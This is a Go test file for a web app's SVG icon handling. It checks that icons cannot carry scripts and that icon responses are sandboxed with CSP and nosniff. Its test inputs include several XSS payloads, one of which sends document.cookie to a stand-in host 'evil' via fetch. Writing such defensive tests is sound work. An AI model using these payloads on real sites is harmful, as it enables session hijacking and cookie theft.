package apps

// An icon is an SVG, and an SVG is a document.
//
// /apps/<slug>/icon.svg served model- and user-authored markup as
// image/svg+xml on this origin with no CSP, no sandbox and no nosniff. In an
// <img> that is inert; navigated to directly it is not — an SVG opened as a
// top-level document runs its own <script>, in this origin, with the viewer's
// session. HttpOnly does not help, because the script does not need to read
// the cookie to use it.
//
// ScanApp reads an app's HTML and refuses document.cookie. The icon is a
// different field and never went through it.

import (
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"mu/internal/auth"
)

// The markup itself: anything that can run does not survive.
func TestAnIconCannotCarryAScript(t *testing.T) {
	for _, bad := range []string{
		`<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://evil/?c='+document.cookie)</script></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil/')"></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><circle r="9" onclick="alert(1)"/></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect/></a></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body onload="alert(1)"/></foreignObject></svg>`,
	} {
		got := safeIcon(cleanIcon(bad))
		if got != defaultAppIcon {
			t.Errorf("an executable icon was served as-is:\n%s\n→ %s", bad, got)
		}
	}
}

// And an ordinary icon is left alone, because the point is a picture.
func TestAnOrdinaryIconIsUntouched(t *testing.T) {
	const good = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32">` +
		`<circle cx="16" cy="16" r="12" fill="#333"/></svg>`
	if got := safeIcon(good); got != good {
		t.Errorf("a plain icon was rejected:\n%s", got)
	}
}

// The header is the lock that actually holds — safeIcon is the second one.
func TestTheIconResponseIsInert(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	const who = "icon_probe"
	if err := auth.Create(&auth.Account{ID: who, Name: who, Secret: "test_secret"}); err != nil {
		t.Fatal(err)
	}
	a, err := CreateApp(who, "Icon Probe", "", "", "",
		`<!doctype html><p>hello</p>`, "", 0, false)
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(os.Getenv("HOME"))

	w := httptest.NewRecorder()
	r := httptest.NewRequest("GET", "/apps/"+a.Slug+"/icon.svg", nil)
	handleIcon(w, r, a.Slug)

	csp := w.Header().Get("Content-Security-Policy")
	if !strings.Contains(csp, "sandbox") {
		t.Errorf("no sandbox on an SVG response (CSP %q)", csp)
	}
	if strings.Contains(csp, "allow-scripts") {
		t.Errorf("the icon sandbox allows scripts (CSP %q)", csp)
	}
	if w.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Error("the icon response does not say nosniff")
	}
}
